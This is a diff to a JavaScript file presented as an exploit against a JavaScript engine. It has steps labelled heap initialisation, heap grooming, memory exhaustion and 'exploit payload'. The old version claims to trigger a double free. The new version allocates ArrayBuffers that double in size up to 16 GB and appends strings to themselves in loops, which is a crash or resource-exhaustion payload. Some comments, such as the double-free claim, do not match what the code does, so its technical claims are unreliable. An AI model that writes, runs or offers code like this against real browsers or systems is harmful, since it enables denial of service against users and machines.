@@ -11,8 +11,8 @@ let UUU = 1;
 // Step 1: Initialize Controlled Memory
 function initializeHeap() {
     let buffers = [];
-    for (let i = 0; i < 1024; i++) {
-        buffers.push(new ArrayBuffer(4096)); // Larger blocks for better grooming
+    for (let i = 0; i < 128; i++) { // Initial manageable buffers
+        buffers.push(new ArrayBuffer(1024)); // Small initial buffer size
     }
     return buffers;
 }
@@ -21,14 +21,13 @@ function initializeHeap() {
 function groomHeap() {
     let tempArray = [];
 
-    for (let i = 0; i < 4096; i++) {
-        let buffer = new ArrayBuffer(4096);
+    for (let i = 0; i < 512; i++) { // More buffers but smaller size
+        let buffer = new ArrayBuffer(16384);
         tempArray.push(buffer);
-        UUU++;
     }
 
-    for (let i = 0; i < 2048; i++) {
-        tempArray[i] = null; // Free up space to create holes in the heap
+    for (let i = 0; i < 256; i++) { // Free some buffers
+        tempArray[i] = null;
     }
 
     return tempArray;
@@ -36,42 +35,52 @@ function groomHeap() {
 
 // Step 3: Memory Exhaustion Function
 function memExh() {
-    let a = new ArrayBuffer(10000000); // Larger buffer for memory exhaustion
-    let se_a = new Uint8Array(a);
-    let c = new ArrayBuffer(32);
-    let se_c = new Uint8Array(c);
-    let bufferArray = [];
-    for (let i = 0; i < 4096; i++) { // Increased iterations
-        bufferArray.push(new ArrayBuffer(1000000)); // Allocate larger buffers
-        if (bufferArray.length > 4096) {
-            bufferArray = [];
-            // Double-free memory
-            // Freeing and reusing memory after double-free
-            for (let j = 0; j < se_a.length; j++) {
-                se_a[j] = 0x41; // Fill with 'A'
+    let size = 1; // Start with 1 byte
+    let maxIterations = 25; // Total number of iterations to reach 16 GB
+
+    for (let i = 0; i < maxIterations; i++) {
+        try {
+            let buffer = new ArrayBuffer(size); // Allocate buffer of current size
+            let view = new Uint8Array(buffer); // View it as an array of bytes
+
+            // Fill with zeros to stress the system
+            for (let j = 0; j < view.length; j++) {
+                view[j] = 0x00; // Fill with zeros
             }
+
+            // Optionally add a delay to simulate prolonged operation
+            // Sleep for a short while to make sure the allocation is processed
+            // await new Promise(r => setTimeout(r, 100));
+
+            size *= 2; // Double the size each iteration
+            if (size > 16 * 1024 * 1024 * 1024) { // Cap size at 16 GB
+                size = 16 * 1024 * 1024 * 1024;
+            }
+        } catch (e) {
+            console.error("Memory allocation failed at size: " + size);
+            break; // Exit on allocation failure
         }
     }
 }
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(100000); // Larger initial string
+    let largeString = "B".repeat(50000); // Adjusted size
     let nestedArray = [];
     let obj = {};
     let iterationCount = 0;
 
     while (true) {
         largeString += largeString;
-        if (largeString.length > 100000000) {
-            largeString = "B".repeat(100000);
+        if (largeString.length > 1000000) {
+            largeString = "B".repeat(50000); // Reset to manage memory usage
         }
 
         memExh(); // Call memory exhaustion during payload
 
         iterationCount++;
-        if (iterationCount > 50) {
-            break; // Limit iterations to avoid endless loop
+        if (iterationCount > 30) { // Fewer iterations to avoid immediate crashes
+            break;
         }
     }
 }
